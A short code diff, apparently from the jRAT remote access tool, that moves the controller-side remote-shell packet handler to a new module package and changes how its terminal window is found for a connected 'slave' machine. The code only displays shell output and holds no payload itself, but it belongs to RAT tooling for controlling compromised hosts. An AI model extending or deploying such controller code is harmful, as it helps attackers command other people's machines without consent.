@@ -1,7 +1,8 @@
-package jrat.controller.packets.incoming;
+package jrat.module.shell.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.ui.frames.FrameRemoteShell;
+import jrat.controller.packets.incoming.IncomingPacket;
+import jrat.module.shell.ui.FrameRemoteShell;
 
 
 public class Packet21RemoteShell implements IncomingPacket {
@@ -10,12 +11,10 @@ public class Packet21RemoteShell implements IncomingPacket {
 	public void read(Slave slave) throws Exception {
 		String command = slave.readLine();
 		
-		FrameRemoteShell frame = FrameRemoteShell.INSTANCES.get(slave);
+		FrameRemoteShell frame = (FrameRemoteShell) slave.getPanel(FrameRemoteShell.class);
 		
 		if (frame != null) {
 			frame.getTerminal().append(command + "\n");
 		}
-
 	}
-
 }
